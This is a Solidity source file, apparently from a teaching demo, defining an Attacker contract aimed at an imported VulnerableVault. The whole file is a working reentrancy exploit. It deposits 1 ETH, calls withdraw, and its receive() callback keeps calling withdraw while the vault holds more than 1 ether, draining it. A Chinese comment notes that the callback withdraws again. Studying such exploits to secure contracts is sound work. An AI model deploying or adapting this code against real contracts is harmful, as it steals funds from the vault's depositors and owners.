// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "base2/VulnerableVaultDemo.sol";
contract Attacker {
    VulnerableVault public target;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    // 回调函数，趁机再次提取
    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}